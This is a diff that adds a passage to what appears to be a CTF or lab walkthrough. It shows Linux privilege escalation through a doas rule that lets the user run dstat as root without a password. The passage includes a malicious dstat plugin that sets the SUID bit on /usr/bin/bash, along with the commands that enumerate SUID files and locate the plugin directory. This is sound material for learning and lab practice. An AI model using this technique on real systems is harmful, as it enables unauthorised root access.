@@ -333,4 +333,36 @@ find / -perm -u=s -type f 2>/dev/null
 
 Doas seems interesting let check the conf file.
 
+![image](https://user-images.githubusercontent.com/69868171/218165140-5d338d3b-a4ad-4dc4-8311-1ac175e64e67.png)
 
+We can run dstat with doas with nopass as user root.
+
+![image](https://user-images.githubusercontent.com/69868171/218165984-6798ccc6-c02a-4fbc-b574-f637745d9b06.png)
+
+Dstat is a versatile tool for generating system resource statistics.  It allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.
+
+#### Exploitation
+
+First off, let find and locate the "dstat" directory.
+
+```
+find / -type d -name dstat 2>/dev/null
+```
+
+![image](https://user-images.githubusercontent.com/69868171/218166531-288221df-8ce4-473f-a974-6114cf2f2732.png)
+
+Now let create a plugin called `dstat_exploit.py` under "/usr/local/share/dstat/".
+
+```py
+import os
+
+os.system('chmod +s /usr/bin/bash')
+```
+
+![image](https://user-images.githubusercontent.com/69868171/218166996-906c3564-7ad0-480f-adb1-554b3c2f037c.png)
+
+Dstat recognizes plugins under "/usr/local/share/dstat/".  Check if the above exploit plugin has been added by executing the following command.
+
+```cli
+dstat --list | grep exploit
+```
